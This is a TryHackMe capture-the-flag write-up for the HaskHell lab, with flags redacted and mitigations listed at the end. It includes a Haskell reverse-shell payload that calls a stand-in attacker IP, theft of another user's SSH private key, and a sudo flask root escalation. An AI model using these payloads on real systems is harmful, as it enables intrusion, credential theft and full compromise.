![Congrats](assets/screenshots/HaskHell/HaskHell%20congrats.png)

# Update HaskHell – TryHackMe CTF Writeup

**Platform:** TryHackMe – HaskHell  
**Difficulty:** Medium  
**Category:** Web Exploitation, Privilege Escalation  
**Author:** Based on public writeup by Harsh Malhotra (modified methodology)  

*This writeup does not contain flags, passwords, or cracked hashes. It is intended for educational purposes and personal review after completing the room.*

## Objective
Gain initial access via a Haskell file upload, escalate to another user via stolen SSH keys, and finally escalate to root using a misconfigured sudo rule for Flask.

## Tools Used
- Nmap
- Gobuster
- FFUF
- Netcat
- cURL
- SSH
- Python

---

## Step 1 – Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -p- 10.10.XXX.XXX
```
**Open ports found:**
- `22/tcp` – OpenSSH
- `5001/tcp` – Gunicorn (Python web server)

## Step 2 – Web Enumeration

### Gobuster
```bash
gobuster dir -u http://10.10.XXX.XXX:5001 -w /usr/share/wordlists/dirb/common.txt
```
**Discovered:**
- `/submit` (HTTP 200)

### FFUF
```bash
ffuf -u http://10.10.XXX.XXX:5001/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
No additional hidden directories found.

### Manual Investigation
`/homework1` revealed:
- Only Haskell files are accepted
- Files are compiled and executed
- Output is saved under an `uploads` directory

`/submit` contained a file upload form.

## Step 3 – Initial Foothold (Reverse Shell)

### Step 3.1 – Malicious Haskell File
```haskell
module Main where
import System.Process

main :: IO ()
main = do
    system "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
    return ()
```

### Step 3.2 – Upload via /submit
```bash
curl -X POST http://10.10.XXX.XXX:5001/submit -F "file=@shell.hs"
```
Server responded with `302 Found` and a redirect to:
```text
/uploads/shell.hs
```

### Step 3.3 – Trigger the Shell
```bash
curl http://10.10.XXX.XXX:5001/uploads/shell.hs
```

### Step 3.4 – Listener
```bash
nc -lvnp 4444
```
A reverse shell as the `flask` user was received.

## Step 4 – Privilege Escalation to prof User

### Step 4.1 – Enumerate Home Directories
```bash
ls -la /home
```
Discovered users: `flask`, `haskell`, `prof`

### Step 4.2 – Read SSH Private Key
```bash
cat /home/prof/.ssh/id_rsa
```
The private key was copied to the attacker machine.

### Step 4.3 – Connect as prof
```bash
chmod 600 prof_key
ssh -i prof_key prof@10.10.XXX.XXX
```
Successful login as `prof`.

## Step 5 – Root Privilege Escalation

### Step 5.1 – Check Sudo Rights
```bash
sudo -l
```
**Result:**
```text
(ALL) NOPASSWD: /usr/bin/flask run
```

### Step 5.2 – Malicious Flask App
```bash
echo 'import os; os.system("/bin/bash")' > /tmp/pwn.py
export FLASK_APP=/tmp/pwn.py
sudo /usr/bin/flask run
```
A root shell was obtained.

## Step 6 – Flags (Redacted)
Both flags are located in standard locations:

- **User flag:** `/home/prof/user.txt`
- **Root flag:** `/root/root.txt`

*Per CTF disclosure rules, flag values are not included here.*

---

## Summary of Attack Chain
1. **Nmap** → ports 22, 5001
2. **Gobuster** → `/submit`
3. `/homework1` → Haskell upload restriction
4. **Haskell reverse shell** → `flask` user
5. **Steal prof SSH key**
6. **SSH as prof**
7. **sudo flask run with malicious FLASK_APP** → root

## Mitigation Recommendations
- Do not allow arbitrary file uploads that are compiled and executed.
- Restrict SSH private key permissions (600) and storage location.
- Avoid NOPASSWD in sudoers for any program.
- Do not allow environment variables like `FLASK_APP` to influence privileged commands.

*Writeup completed for educational purposes only. Room: TryHackMe – HaskHell*
